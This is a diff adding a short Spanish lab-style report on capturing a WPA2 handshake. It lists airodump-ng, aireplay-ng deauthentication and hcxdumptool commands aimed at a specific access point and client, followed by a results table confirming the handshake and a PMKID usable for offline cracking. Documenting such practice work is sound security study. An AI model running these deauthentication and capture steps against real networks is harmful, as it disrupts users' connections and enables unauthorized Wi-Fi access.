@@ -1,0 +1,30 @@
+# Captura del Handshake WPA2
+
+## Comandos ejecutados
+
+```bash
+# 1. Captura focalizada para identificar cliente
+sudo airodump-ng --bssid C0:25:67:12:6E:59 --channel 3 wlan0mon
+
+# 2. Captura a archivo
+sudo airodump-ng -c 3 --bssid C0:25:67:12:6E:59 -w capturap3 wlan0mon
+
+# 3. Deautenticación para forzar reconexión
+sudo aireplay-ng --deauth 3 -a C0:25:67:12:6E:59 -c 60:FF:9E:6D:B9:5E wlan0mon
+
+# 4. Captura pasiva complementaria
+sudo hcxdumptool -i wlan0mon -w captura.pcapng
+```
+
+## Resultados
+
+| Parámetro | Valor |
+|-----------|-------|
+| Archivo generado | capturap3-01.cap |
+| Handshake confirmado | ✅ WPA handshake: C0:25:67:12:6E:59 |
+| PMKID detectado | ✅ (permite ataque offline sin cliente conectado) |
+| Tiempo de captura | ~4 minutos |
+| Frames capturados | 4,656 datos / 6,641 frames totales |
+| Paquetes PCAPNG | 963 paquetes |
+
+> Los archivos `.cap` y `.pcapng` no se suben al repositorio por privacidad.
